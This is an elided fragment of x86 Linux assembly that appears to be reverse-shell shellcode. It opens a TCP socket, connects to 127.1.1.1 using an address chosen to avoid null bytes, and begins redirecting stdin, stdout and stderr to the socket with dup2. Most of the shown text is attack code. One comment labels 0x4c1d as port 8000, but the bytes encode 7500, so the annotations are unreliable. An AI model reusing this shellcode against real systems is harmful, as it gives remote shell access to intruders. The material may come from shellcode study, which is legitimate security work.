...
_start:
	...
	xor eax, eax		; VERSION2 Clean eax register
	push eax 		; VERSION2 Push protocol to the stack (0)
	push 0X1		; Push the type to the stack (SOCK_STREAM=1)
	push 0X2		; Push the domain to the stack (AF_INET=2)

	;xor eax, eax		COMMENTED VERSION2
	...
	push 0x0101017f	; VERSION2, to avoid null bytes, use as localhost 127.1.1.1
	push word 0x4c1d	; Port 8000 in reverse order to the stack (LIFO)
	...
	mov bl, 3		; Move 3 to BL --> Flag 3 to connect
	mov ecx, esp		; Move stack pointer to ECX
	int 0x80		; Interruption
	
	; Assign stdin, stdout, stedrr to a new socket using dup2 --> systemcall 0x3f 
	
	xor ecx, ecx		; VERSION 2, XOR ecx
	add ecx, 3		; VERSION 2, add 3 to ecx
	dupwhile:
